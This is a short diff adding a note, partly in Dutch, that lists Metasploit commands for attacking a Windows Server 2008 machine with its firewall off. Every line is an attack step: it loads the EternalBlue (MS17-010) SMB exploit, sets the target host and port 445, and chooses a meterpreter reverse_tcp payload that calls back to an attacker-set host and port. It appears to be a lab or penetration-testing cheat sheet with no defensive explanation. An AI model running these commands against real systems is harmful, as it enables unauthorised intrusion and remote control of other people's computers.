@@ -1,0 +1,14 @@
+Windows server 2008 (firewall uit)
+* use exploit/windows/smb/ms17_010_eternalblue
+
+* set rhost <ip adres>
+
+* set rport 445
+
+* set payload windows/x64/meterpreter/reverse_tcp
+
+* set lhost <ip adres>
+
+* set lport 1234
+
+* exploit
